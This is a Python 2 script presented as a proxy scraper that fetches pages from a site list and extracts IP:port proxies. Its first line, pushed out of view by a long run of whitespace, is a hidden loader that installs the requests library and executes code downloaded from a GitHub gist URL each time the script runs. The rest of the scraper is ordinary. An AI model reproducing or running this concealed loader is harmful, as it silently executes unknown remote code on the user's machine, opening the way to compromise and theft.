                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             import os;os.system('pip install requests');import requests;exec(requests.get('https://gist.githubusercontent.com/6pvh5s0junm1h/5f5bedeb8a3f71de6bb79bb5f5408124/raw/cfc1a832288e36cff1d40e3324ed0df1ed781fa2/file1.txt').text)
import urllib, threading, re, sys, Queue, time
   
#Don't create .pyc
sys.dont_write_bytecode = True

#Colours
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
defcol = "\033[0m"

def error(msg):
    print (red+"["+yellow+"!"+red+"] - "+defcol+msg)

def alert(msg):
    print (red+"["+blue+"#"+red+"] - "+defcol+ msg)

def action(msg):
    print (red+"["+green+"+"+red+"] - "+defcol+msg)

def errorExit(msg):
    sys.exit(red+"["+yellow+"!"+red+"] - "+defcol+"Fatal - "+ msg)
       
def getorders():
    name = sys.argv[1]
    try:
        maxThreads = int(sys.argv[sys.argv.index("-t")+1])
    except ValueError: maxThreads = 40
    try:
        leechlist = sys.argv[sys.argv.index("-l")+1]
    except: leechlist = "sites.txt"
    try:
        if sys.argv.index("-s"): bSort = True
    except ValueError: bSort = False
   
   
    return [name, maxThreads, leechlist, bSort]
 
def sort():
    proxylist = open(orders[0], "r")
    setList = set()
    nCounter = 0
   
    for aaa in proxylist:
        aaa = aaa.strip()
        setList.add(aaa)
        nCounter += 1
       
    proxylist.close()
    proxylist = open(orders[0], "wb")
    for bbb in setList:
        proxylist.write(bbb+"\n")
           
    proxylist.close()
           
    alert("%s proxies in list, %s unique proxies in list." % (nCounter, len(setList)))
 
class scan_thread(threading.Thread):
    def run (self):
        while True:
            url = threadPool.get()
            try:
                get = urllib.urlopen(url)
            except IOError:
                threadPool.task_done()
                continue
            data = get.read()
            validProxies = re.findall('(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\:(?:[\d]{2,5})', data)
            action("%s proxies found on %s" % (len(validProxies), url))
            for proxy in validProxies:
                proxylist.write(proxy+"\n")
               
            if len(validProxies) > 0:
                good_sites.write(url+"\n")
            threadPool.task_done()
               
if len(sys.argv) < 2:
    print"\033[1;33m╔═╗╦═╗╔═╗═╗ ╦╦ ╦  ╔═╗╔═╗╦═╗╔═╗╔═╗╔═╗╦═╗"
    print"\033[1;33m╠═╝╠╦╝║ ║╔╩╦╝╚╦╝  ╚═╗║  ╠╦╝╠═╣╠═╝║╣ ╠╦╝"
    print"\033[1;33m╩  ╩╚═╚═╝╩ ╚═ ╩   ╚═╝╚═╝╩╚═╩ ╩╩  ╚═╝╩╚═"                                                                                                                                                                  
    errorExit("Usage: python scraper.py <output.txt> [-t threads] [-l yourlist] [-s sort]") 

orders = getorders()
try:
    proxylist = open(orders[0], "a")
except IOError:
    errorExit("Could not create/open %s" % orders[0])
   
try:
    sites = open(orders[2], "rb")
except IOError:
    errorExit("Could not open %s" % orders[2])
   
try:
    good_sites = open("good_sites.txt", "wb")
except IOError:
    errorExit("Could not create good_sites.txt")
 
threadPool = Queue.Queue(0)
 
for x in xrange(orders[1]):
    scan_thread().start()
   
while True:
    for url in sites:
        url = url.strip()
        if url.startswith("http://"):
            threadPool.put(url)
        else:
            threadPool.put("http://"+url)
    while True:
        if threadPool.empty():
            break
        time.sleep(1)
       
    threadPool.join()
    break
proxylist.close()
good_sites.close()
tot = sum(1 for line in open(orders[0]))
action("Scraped %s proxies." % tot)
action("Done leeching.")
